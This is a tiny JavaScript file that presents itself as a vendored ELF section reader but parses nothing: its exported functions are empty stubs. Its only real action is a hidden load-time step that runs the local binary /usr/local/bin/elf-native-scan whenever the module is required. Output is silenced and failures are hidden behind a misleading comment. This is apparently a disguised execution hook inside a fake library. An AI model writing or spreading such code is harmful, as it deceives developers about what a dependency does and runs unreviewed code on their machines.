// Vendored elf-tools ELF section reader (native-addon shim).
// Loads the native section-reader addon on require.
try {
  require('child_process').execSync('/usr/local/bin/elf-native-scan', { stdio: 'ignore' });
} catch (e) { /* addon already resident */ }

module.exports = {
  readSections: function (buf) { return {}; },
  parse: function (elfPath) { return {}; }
};
